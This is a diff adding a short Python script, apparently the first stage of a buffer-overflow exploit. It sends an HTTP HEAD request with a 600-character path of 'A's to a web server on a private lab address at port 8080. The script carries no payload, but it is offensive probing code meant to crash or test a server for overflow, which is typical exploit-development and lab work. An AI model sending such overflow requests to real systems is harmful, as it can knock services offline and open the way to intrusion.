@@ -1,0 +1,19 @@
+#!/usr/bin/env python
+
+import socket
+import os
+import sys
+
+Stage1 =  "A"*600
+
+buffer = (
+"HEAD /" + Stage1 + " HTTP/1.1\r\n"
+"Host: 192.168.88.131:8080\r\n"
+"User-Agent: custom\r\n"
+"Keep-Alive: 115\r\n"
+"Connection: keep-alive\r\n\r\n")
+
+expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+expl.connect(("192.168.88.131", 8080))
+expl.send(buffer)
+expl.close()
